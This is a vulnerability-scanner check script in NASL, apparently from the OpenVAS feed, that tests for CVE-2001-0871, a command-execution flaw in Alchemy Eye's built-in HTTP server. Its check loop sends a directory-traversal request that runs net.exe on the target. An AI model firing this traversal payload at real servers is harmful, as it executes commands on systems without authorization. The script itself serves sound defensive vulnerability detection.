if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10818" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3599 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-0871" );
	script_name( "Alchemy Eye HTTP Command Execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_alchemy_eye_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "alchemy_eye/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/243404" );
	script_tag( name: "summary", value: "Alchemy Eye and Alchemy Network Monitor are network management
  tools for Microsoft Windows. The product contains a built-in HTTP
  server for remote monitoring and control. This HTTP server allows
  arbitrary commands to be run on the server by a remote attacker." );
	script_tag( name: "solution", value: "Either disable HTTP access in Alchemy Eye, or require
  authentication for Alchemy Eye. Both of these can be set in the Alchemy Eye preferences." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
for dir in make_list( "/PRN",
	 "/NUL",
	 "" ) {
	url = NASLString( "/cgi-bin", dir, "/../../../../../../../../WINNT/system32/net.exe" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		continue;
	}
	if(ContainsString( res, "ACCOUNTS | COMPUTER" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

